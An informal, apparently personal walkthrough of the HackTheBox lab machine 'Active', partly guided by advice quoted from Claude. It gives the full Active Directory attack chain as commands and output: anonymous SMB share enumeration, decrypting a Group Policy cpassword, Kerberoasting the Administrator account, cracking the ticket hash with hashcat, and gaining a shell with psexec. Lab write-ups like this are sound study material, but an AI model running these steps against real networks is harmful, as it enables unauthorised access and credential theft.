this is a windows machine.


lets get crackin.

```
nmap $(cat ./IP) -sS -sV -oN nmap.txt
```

sweet. we need to find out how many SMB shares are on this.

`smbclient` ? probs.

time to edit `/etc/hosts` again. need to memorize this. `active.htb` == `cat ./IP`

```
smbclient active.htb
```

wait. just realized. I don't need to keep storing stuff in `./IP`, if I just edit /etc/hosts. lmao. dog darn it. 

ex:

```
└─$ smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put /home/henrypost/Downloads/handle.exe handle.exe'


smbclient 'active.htb' 
```

hm. okay. stuck. i'm going to ask z.ai for advice.

well. let's try claude, since i have 10 days left on my paid plan.

okay claude said a lot:

53=dns
88=kerberos
389/3268=ldap
445=smb
135=rpc

"classic AD box". cool.

"enum smb shares first, its easy lol" - k thx claude.

```
# Try anonymous/null session enumeration
smbclient -L //active.htb -N

# Or use smbmap
smbmap -H active.htb

# Or crackmapexec
crackmapexec smb active.htb --shares
```

kk. lets do it.

```

smbclient -L //active.htb -N

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to active.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

sweet, i guess we can enum all these shares and see if they're null login able.

next one

```
smbmap -H active.htb

[+] IP: 10.129.13.147:445       Name: active.htb                Status: Authenticated                                                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

ok, mildly more useful, "Replication" has RO access, wew


tip frm claude:

If you find any accessible shares, you can browse them:

bash

```bash
smbclient //active.htb/SHARENAME -N
```

ok. so. i dont think claude knows that netexec is replacing crackmapexec. but w/e it doesnt matter
```
crackmapexec smb active.htb --shares
(session deleted???)

crackmapexec smb active.htb --share Replication
(not useful)
```
...
```
smbclient //active.htb/Replication -N

┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Active]
└─$ smbclient //active.htb/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir active.htb
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir ..
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir .
NT_STATUS_NO_SUCH_FILE listing \.
smb: \> 


(wtf do I do here? this seems possibly useful.)
```
okay. so. claude says I'm right where i want to be.

i can just download all the goodies.

```bash
smbget -R smb://active.htb/Replication -U '' -N #doesnt work lol
```

```bash
smbclient //active.htb/Replication -N -c 'prompt OFF;recurse ON;lcd /home/henrypost/Git/oscp/boxes/htb/Active/Replication;mget *'

# yeeeeep *BURRRRRP*

┌──(henrypost㉿kali-toughwolf)-[~/…/boxes/htb/Active/Replication]
└─$ smbclient //active.htb/Replication -N -c 'prompt OFF;recurse ON;lcd /home/henrypost/Git/oscp/boxes/htb/Active/Replication;mget *'
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (7.0 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.3 KiloBytes/sec) (average 1.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.7 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (9.4 KiloBytes/sec) (average 3.0 KiloBytes/sec)
                                                                                 
```
cool. data. wew.
what do with it?
okaaaay...claude...calm down gurl.

"""
PERFECT! You got it! Now look at that beautiful line:

```
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

**THAT'S THE GOLDEN TICKET!** 🎯
"""

good lord... linkedin slop posting esque. please chill.

golden ticket? what is this? some kerberos thing?
`cpassword` prop in xml. cool.

lets juhh.h....uh. just copy this to `./`...

`./goldenticketiguess.xml`

okay. cool.

```xml
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>

edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

active.htb\SVC_TGS

# hm, i guess SVC_TGS is probably ticket granting service? wonder how to abuse.

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18

cool. uh. what do.
```

"Now we need to figure out which user this password belongs to."

erm. `SVC_TGS`? lets see.

```bash
crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

(ok. but. wtf does this mean? the creds work? i think so.)
```

```bash
# **2. Enumerate shares with the valid creds:**

smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

[+] IP: 10.129.13.147:445       Name: active.htb                Status: Authenticated                                                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

sick, nuts. got 4 shares RO access. time to keep digging.


lets use the last command that claude recommended.

```bash
smbclient //active.htb/Users          -U 'SVC_TGS%GPPstillStandingStrong2k18'
smbclient //active.htb/NETLOGON       -U 'SVC_TGS%GPPstillStandingStrong2k18' # doesnt work
smbclient //active.htb/SYSVOL         -U 'SVC_TGS%GPPstillStandingStrong2k18' # doesnt work
smbclient //active.htb/Replication    -U 'SVC_TGS%GPPstillStandingStrong2k18'
```


```
smb: \SVC_TGS\Desktop\> get user.txt
```
sweet. user flag pwned.


hm. well. going to ask claude what i should do next.
...or,

nah, screw AI. i could try to just uh. spider? how to spider smb? dunno. `hacktricks.xyz` to the rescue!

woof. exhausted. time to resume later.

okay. awake again, yay.

let's try to spider SMB.

https://www.netexec.wiki/smb-protocol/spidering-shares

```bash
nxc smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --spider "//active.htb/Users" --pattern txt

# why doesn't above work? users works with smb_client but not with nxc? asked claude.

# ok so apparently above is wrong. and we should use:

nxc smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --spider Users --pattern txt

# timeout. hm. i guess we cant use nxc spider?

	
```

OKAY, so, claude sez:

	For privesc on this box, you probably want to look into **Kerberoasting** that `SVC_TGS` account (hint: the username is a clue! 😉).

alright. leave this for later b/c work demands i do other tasks.

```
use auxiliary/gather/kerberoast
set LDAPDomain active.htb
set LDAPPassword GPPstillStandingStrong2k18
set LDAPUsername SVC_TGS
set RHOSTS active.htb
```

well, ripperoni to this lab, i think we're almost done boys...

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS:445*$cd689056cf23e93ad7074082e5ef92c6$27fb6a26611f76d5d14aae86cc7c91b9a18a5ef0918034b3140798a619a7b266fe8f6099257091530138b16881fa5303539052bd64241e14857b22346edacf738a5696cdf70f796005d56a8a3e5b4cc7c047a743794d7af6a8841eee2b8c56037b0671a3765970960558ae18e5909b6bdf13de3092cfbf1d044b1bbc7dc63221c6d182cbe767179e9789939029663c531a544e3e7d250c65025cafab67fef707b7d54e68e6be9b747c93cc5fff6851a0b2b8711433b74cfafad23bdc342bea9c9825ccf5dd6a4a377deb8484b287de76c37c061a8498ba2f34ae8484a580848e4083f15ce416269dfe3a4b632add2258e2e645a87856a30ef9c3092bda9466e1e54527ee15c064f2b60d644a1650d5fe57c317ad03b4db2cfe1b2e56235030654c931fb6fb4a175f2e0f0f0661838eafc50925c5ad0a5db789453ddb92ac5061eb65020c0c2175542ed77092334d1ff4aae7a9e8cfc45b6be8d864307b745f88d16cb1a905c0f0e2ed92185b49c5c7ae3392415172bcb9e2ab93f3a14f8c642e95177b5e9e76ad6bcc65792bb1e9d1c6ecf068e283b041e4e2c86c579190efaf090b3f1ecc584c4c593f82413b969b11f121b77e4d18d1acc80dff950688503fd8fef7b76c26e51d4845aaf3befe5c46277a969758ab10a92ca9572691efc3038fc50c2fcf747c56568b6d00a04a65ddc9731e7e87db636f2ef8fa2a604cc2b145b590c3462a72ef7a51f2971c755d1c31b451141dceb029afa2abbc5be0c09ae0398d660c36cee8012d785b4a5c413ac18a8769f1bbcddc0114e6956c45917639c5d4ed2fc7e42e80f9596696cc32739b99a49f62528d6a0db8883702cd7589435342a4b97ba27688b043110fd0da04c6d179d8c1a2e2e1a7364081867664d5bb8f453c61ae4434be2bc39207e14729092c01c9d86d6f09bc2ddf3ca24cc19df34628411b706f4fe0d02bb7477cd01f36a8e9448ddb45eeedbfe58ff993680d58dfb1a69bf42a64868a5814f52c9ca8d70ff8b6fd6bbed52dcbfd5a7a7dd38d9b2022fa7bb3486b87e2d9888cac9d3fcc896574ce6bb10ff77b3165fd699ad9f2943feaec1e129cdf0ffc45d4dc6e31fb8c818755e009ea58f4977b5a1965ac921595fa4e9c0f0a435aeb7fc19c0e3e8d90dad72fa8d81e2e6294fc8b46b181f28ee0fbfe0b46db309867a059a5b822eebc111cf8305259f46bace9f43a15429f80beef395fde796c1efe93ce18a59524750049a30ae56862a4

```
wtf do I do with this ticket now? i feel like it's important....

okay. just hashcat, wew

	hashcat -O -m 13100 admin.hash /usr/share/wordlists/rockyou.txt --show

	Ticketmaster1968

cool.

now uh. root flag incoming.

	impacket-psexec administrator@active.htb
